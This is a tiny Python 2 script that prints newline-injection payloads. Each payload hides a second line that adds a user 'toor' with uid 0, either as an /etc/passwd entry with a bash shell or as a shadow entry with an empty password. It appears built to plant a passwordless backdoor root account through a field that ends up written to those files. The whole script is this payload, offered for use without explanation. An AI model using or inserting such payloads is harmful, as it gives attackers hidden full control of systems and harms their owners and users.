import sys

if len(sys.argv) > 1 and sys.argv[1] == "p":
	print "a\x0atoor:x:0:0::/home/toor:/bin/bash"
else:
	print "a\x0atoor::0:0:0:0:::"
